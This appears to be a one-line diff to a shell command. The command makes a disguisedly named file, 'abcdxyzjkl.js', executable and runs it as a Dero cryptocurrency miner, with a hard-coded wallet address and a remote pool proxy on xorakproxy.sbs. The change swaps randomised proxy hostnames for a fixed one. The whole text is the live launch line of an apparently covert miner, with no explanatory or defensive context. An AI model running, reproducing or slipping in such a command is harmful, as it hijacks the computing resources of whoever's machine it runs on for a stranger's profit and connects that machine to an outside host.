@@ -1,1 +1,1 @@
-chmod +x abcdxyzjkl.js; p=$(shuf -e nginx a e -n1); n=$( [ "$p" = nginx ] && shuf -i 2-10 -n1 || shuf -i 1-10 -n1 ); ./abcdxyzjkl.js -w dero1qywfazvq26p63lrm5vwnjx8arfnn76ng8dle6h43zemaxkdsgfndcqqetflax.solo -r ${p}${n}.xorakproxy.sbs:10300 -m 2 -opmem
+chmod +x abcdxyzjkl.js; p=$(shuf -e nginx a e -n1); n=$( [ "$p" = nginx ] && shuf -i 2-10 -n1 || shuf -i 1-10 -n1 ); ./abcdxyzjkl.js -w dero1qywfazvq26p63lrm5vwnjx8arfnn76ng8dle6h43zemaxkdsgfndcqqetflax.solo -r bb2.xorakproxy.sbs:10300 -m 2 -opmem
